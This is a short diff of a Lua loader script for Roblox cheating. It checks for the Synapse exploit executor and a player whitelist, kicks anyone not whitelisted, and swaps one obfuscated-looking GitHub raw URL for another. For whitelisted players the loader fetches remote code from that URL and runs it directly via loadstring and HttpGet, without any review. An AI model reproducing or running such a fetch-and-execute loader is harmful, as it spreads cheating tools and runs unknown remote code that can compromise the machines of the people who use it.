@@ -19,7 +19,7 @@ _G.whitelist = {
 
 if syn then
     if _G.whitelist[game.Players.LocalPlayer.Name] then
-          loadstring(game:HttpGet('https://raw.githubusercontent.com/asiohfasuifa/hudgfiashfsafa/main/asdsdfgdfdfgdfgfasd.lua', true))()
+          loadstring(game:HttpGet('https://raw.githubusercontent.com/fosahfasufhasf/stgsdigjsdg/main/gffsdhifadasd.lua', true))()
 else game.Players.LocalPlayer:Kick("You aren't whitelisted!")
 end
 else game.Players.LocalPlayer:Kick("it seems like your exploit isn't supported")
